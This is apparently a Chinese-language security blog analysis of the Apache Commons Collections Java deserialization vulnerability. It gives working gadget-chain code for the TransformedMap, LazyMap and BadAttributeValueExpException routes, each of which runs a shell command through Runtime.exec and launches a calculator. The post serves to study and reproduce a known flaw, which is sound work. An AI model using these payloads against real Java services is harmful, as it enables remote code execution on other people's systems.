---
title: JAVA Common Collections 反序列化漏洞分析
categories: [Security]
tags: [java, deserialization]
date: 2018-11-12T00:00:00+08:00
---



## 引言

Common Collections库为JAVA提供了很多常用且强大的数据结构，在JAVA开发中使用较为广泛，该库的漏洞会导致极为广泛的安全问题。在漏洞曝出伊始，WebLogic、WebSphere、JBoss、Jenkins等基于JAVA开发的各种中间件及框架均受到影响。

本文对JAVA的Common Collections库的反序列化漏洞进行了分析，并进行了复现测试。

## 测试环境

JAVA版本：

```shell
$ java -version
openjdk version "1.8.0_151"
OpenJDK Runtime Environment (build 1.8.0_151-8u151-b12-0ubuntu0.17.04.2-b12)
OpenJDK 64-Bit Server VM (build 25.151-b12, mixed mode)
```

Common Collections库版本：**3.3.2**

该版本中对不安全的类的序列化做出了限制，可以通过设置JAVA *VM options*来解除此限制：

```
-Dorg.apache.commons.collections.enableUnsafeSerialization=true
```

## 漏洞成因分析

Common Collections库中有许多常用的数据结构，这些数据结构能够通过关联`Transformer`类来利用其中自定义的`transform`函数在某些时机对数据做一些检查或修改。

Common Collections的各种反序列化漏洞的关键点有两个：

- 利用`InvokerTransformer`、`ConstantTransformer`、`ChainedTransformer`等类构建恶意代码执行序列，这其中的代码执行需要利用[JAVA的反射机制](https://www.sczyh30.com/posts/Java/java-reflection-1/)，并通过类中的`transform`方法调用。
- 寻找Common Collections中的类在反序列化时，会触发调用`transform`方法的情况，并以此来构建反序列化漏洞的payload。

下文对上述两个关键点进行详细叙述。

### 代码执行序列的构建

#### JAVA中执行shell命令

在JAVA中执行命令，一般的方式是利用`Runtime`类，比如执行计算器程序：

```java
Runtime.getRuntime().exec("gnome-calculator")
```

构建代码执行序列的目的就是达成上述的代码执行效果。

#### InvokerTransformer类

首先看`InvokerTransformer`类，下述代码含有该类的部分构造函数和`transform`函数：

```java
/**
 * Constructor that performs no validation.
 * Use <code>getInstance</code> if you want that.
 * 
 * @param methodName  the method to call
 * @param paramTypes  the constructor parameter types, not cloned
 * @param args  the constructor arguments, not cloned
 */
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;                                                    
    iParamTypes = paramTypes;
    iArgs = args;
}

/**
 * Transforms the input to result by invoking a method on the input.
 * 
 * @param input  the input object to transform
 * @return the transformed result, null if null input
 */
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
            
    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

由上述代码可以看出，`InvokerTransformer`类的`transform`函数中，利用反射机制进行了函数的调用；此外，利用反射机制进行调用时候的各个参数（`iMethodName`、`iParamTypes`、`iArgs`）皆可通过构造函数等进行自主赋值。

然而通过上述反射的方法，是无法一次就达成执行命令的效果的，`ChainedTransformer`类“应运而生”。

#### ChainedTransformer类

`ChainedTransformer`类是`Transformer`的子类，顾名思义，该类的构造函数可以接受一个`Transformer`对象数组，将一系列的`Transformer`对象链接起来，聚合成一个`Transformer`对象。

该类的部分源代码如下：

```java
/**
 * Constructor that performs no validation.
 * Use <code>getInstance</code> if you want that.
 * 
 * @param transformers  the transformers to chain, not copied, no nulls
 */
public ChainedTransformer(Transformer[] transformers) {
    super();
    iTransformers = transformers;
}

/**
 * Transforms the input to result via each decorated transformer
 * 
 * @param object  the input object passed to the first transformer
 * @return the transformed result
 */
public Object transform(Object object) {                          
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

其中`transform`函数的代码逻辑很简单，就是逐个调用`iTransformers`变量中的各`Transformer`对象的`transform`函数，并将当前`transform`函数的返回结果作为下一次调用的参数。

这样就可以组成一个调用链，来实现执行shell命令的代码逻辑。

但还有一个问题是，需要给最初的`InvokerTransformer`的`transform`函数的input参数传参。这个问题可以通过`ConstantTransformer`类来解决。

#### ConstantTransformer类的transform函数

`ConstantTransformer`类的`transform`函数逻辑十分简单，如下：

```java
/**
 * Transforms the input by ignoring it and returning the stored constant instead.
 * 
 * @param input  the input object which is ignored
 * @return the stored constant
 */
public Object transform(Object input) {
    return iConstant;
}
```

`iConstant`为类构造函数的传入参数，如类名所示，该函数的作用就是将它直接返回。

#### 命令执行调用链

综上所述，通过如下代码构造执行shell命令的调用链：

```java
public static Transformer generate_chain() {
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
            new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"gnome-calculator"})
        };
    Transformer transformedChain = new ChainedTransformer(transformers);

    return transformedChain;
}
```

直接对该函数的返回值调用`transform(null)`方法，能够直接执行shell命令，弹出计算器。

至此，shell命令执行代码链构造完成。

### 寻找反序列化时的触发点

下一步的任务是寻找对象在反序列化时，会调用`Transformer`类对象的`transform`函数的代码。

JAVA的序列化结果是以`ACED 0005`开头的二进制串，在反序列化的时候会调用对象的`readObject`函数，具体的JAVA反序列化的知识在此不再赘述。

寻找反序列化触发点的关键是：寻找在对象的`readObject`函数中能够直接或间接调用`transform`函数的情况。一般来说，不会有在`readObject`函数中直接调用`transform`函数的情形，需要寻找间接调用的情形（即在`readObject`函数所调用的函数中直接或间接调用了`transform`函数的情形）。

具体的方法可以是，从直接寻找调用了`transfrom`函数的方法开始，根据函数调用关系分析回溯，看是否能形成一个从`readObject`函数到`transform`函数的调用链条。

下文针对`TransformedMap`和`LazyMap`两个类中的反序列化漏洞触发情景进行分析和测试。

需要注意的是，如果使用Debug模式对程序进行分析调试，由于调试器会提前计算变量值，所以可能在程序执行到实际的漏洞触发代码前，shell指令就已经被执行。

#### TransformedMap 反序列化漏洞分析与测试

如上所述，接下来的目标是寻找在反序列化过程中能够调用`transform`的情境，以在反序列过程中执行构造好的命令执行链。

`TransformedMap`中的`checkSetValue`函数调用了`transform`函数，其函数原型如下：

```java
/**
 * Override to transform the value when using <code>setValue</code>.
 * 
 * @param value  the value to transform
 * @return the transformed value
 * @since Commons Collections 3.1
 */ 
protected Object checkSetValue(Object value) {         
    return valueTransformer.transform(value);
}
```

从上述函数说明的注释中可以看出，在调用`setValue`函数时会调用此函数。具体地，`setValue`函数的实现在抽象类`AbstractInputCheckedMapDecorator`（即为`TransformedMap`类的父类）中，`setValue`函数实现如下：

```java
public Object setValue(Object value) {  
    value = parent.checkSetValue(value);
    return entry.setValue(value);       
}
```

所以在`Transformed`类的`setValue`方法被调用时，即可触发命令执行，弹出计算器。如下：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"gnome-calculator"})
};
Transformer transformedChain = new ChainedTransformer(transformers);


Map normalMap = new HashMap();
normalMap.put("key", "value");

Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);


Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();
entry.setValue("test");
```

反序列化漏洞触发的另一个重要的类是`AnnotationInvocationHandler`类，在网上的其他资料中，显示此类的`readObject`函数中调用了`setValue`函数。利用反射机制生成序列化结果的payload，对该序列化结果进行反序列化即可触发命令执行。生成payload的代码如下：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"gnome-calculator"})
};
Transformer transformedChain = new ChainedTransformer(transformers);


Map normalMap = new HashMap();
normalMap.put("key", "value");

Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);


Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
Object instance = ctor.newInstance(Retention.class, transformedMap);

// the function to write searialized object to file
serialize_write_file(instance);
```

然而在实际测试中发现，当前JDK版本的`AnnotationInvocationHandler`类的`readObject`函数略有变化，已经不再调用`setValue`方法，因此在反序列化时无法成功触发命令执行。

#### 利用动态代理机制的LazyMap反序列化漏洞分析与测试

`LazyMap`类的`get`函数也调用了`transform`函数，当该类的`map`中不存在对应的`key`时，则会调用`transform`方法。如下：

```java
public Object get(Object key) {
    if (!this.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        this.map.put(key, value);
        return value;
    } else {
        return this.map.get(key);
    }
}
```

此处仍需利用`AnnotationInvocationHandler`类，不过该类的`readObject`函数没有调用`LazyMap`的`get`方法，但`invoke`函数中调用了`get`方法，如下：

```java
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();
    Class<?>[] paramTypes = method.getParameterTypes();

    // Handle Object and Annotation methods
    if (member.equals("equals") && paramTypes.length == 1 &&
        paramTypes[0] == Object.class)
        return equalsImpl(args[0]);
    if (paramTypes.length != 0)
        throw new AssertionError("Too many parameters for an annotation method");

    switch(member) {
    case "toString":
        return toStringImpl();
    case "hashCode":
        return hashCodeImpl();
    case "annotationType":
        return type;
    }

    // Handle annotation member accessors
    Object result = memberValues.get(member);

    if (result == null)
        throw new IncompleteAnnotationException(type, member);

    if (result instanceof ExceptionProxy)
        throw ((ExceptionProxy) result).generateException();

    if (result.getClass().isArray() && Array.getLength(result) != 0)
        result = cloneArray(result);

    return result;
}
```

所以此处的利用方法要用到Java的[动态代理机制](https://www.jianshu.com/p/6f6bb2f0ece9)。

首先利用`AnnotationInvocationHandler`这一动态代理类来为`LazyMap`生成一个代理对象，然后再将该代理对象作为`AnnotationInvocationHandler`类构造方法的参数生成最终要序列化生成payload的对象。

这样在反序列化的时候，`AnnotationInvocationHandler`类的`readObject`函数在调用时会调用代理对象的方法，根据动态代理机制，也就会触发`AnnotationInvocationHandler`的`invoke`函数，进而会发生`LazyMap`类的`get`函数的调用，随后触发`transform`函数并触发命令执行。

生成payload的代码如下所示：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"gnome-calculator"})
};
Transformer transformedChain = new ChainedTransformer(transformers);


Map normalMap = new HashMap();
Map lazyMap = LazyMap.decorate(normalMap, transformedChain);

//lazyMap.get("key");

Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);

InvocationHandler invo = (InvocationHandler) ctor.newInstance(Retention.class, lazyMap);

Map mapProxy = Map.class.cast(Proxy.newProxyInstance(invo.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), invo));

Object instance = ctor.newInstance(Retention.class, mapProxy);

// the function to write searialized object to file
serialize_write_file(instance);
```

然而同样由于JDK版本的问题，该种方式的反序列化同样不能成功实现命令执行。（参考[ysoserial issue](https://github.com/frohoff/ysoserial/issues/65)）

#### 利用BadAttributeValueExpException类的LazyMap反序列化漏洞分析与测试

网络上对于Common Collections的反序列化分析基本集中于上述两种利用方式，然而它们在本文的测试环境中无法复现。

在Github上的[ysoserial](https://github.com/frohoff/ysoserial)项目中，发现其中的CommonsCollections5可以使用，它同样是基于反序列化时调用`LazyMap`的`get`方法。

可以使用下述代码生成序列化后的payload：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"gnome-calculator"})
};
Transformer transformedChain = new ChainedTransformer(transformers);

Map normalMap = new HashMap();
Map lazyMap = LazyMap.decorate(normalMap, transformedChain);

TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

BadAttributeValueExpException val = new BadAttributeValueExpException(null);
Field valfield = val.getClass().getDeclaredField("val");
valfield.setAccessible(true);
valfield.set(val, entry);

serialize_write_file(val);
```

具体的命令执行触发过程如下：

`BadAttributeValueExpException`类的`readObject`函数如下：

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

其中`valObj`为构造的`TiedMapEntry`类的对象，可以看到其中调用了该类的`toString`函数，再来看此`toString`函数：

```java
public String toString() {
    return this.getKey() + "=" + this.getValue();
}
```

而`getValue`函数为：

```java
public Object getValue() {
    return this.map.get(this.key);
}
```

此处的`this.map`即为我们构造的`LazyMap`对象，在此处调用了`get`函数，则也就触发了命令执行代码，弹出计算器。

## 参考资料

[深入解析Java反射（1） - 基础](https://www.sczyh30.com/posts/Java/java-reflection-1/)

[代理模式及Java实现动态代理](https://www.jianshu.com/p/6f6bb2f0ece9)

[Apache-Commons-Collections反序列化](https://www.secpulse.com/archives/72937.html)

[JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用](https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/)

[ysoserial - Github](https://github.com/frohoff/ysoserial)

[java反序列化工具ysoserial分析](https://wps2015.org/drops/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html)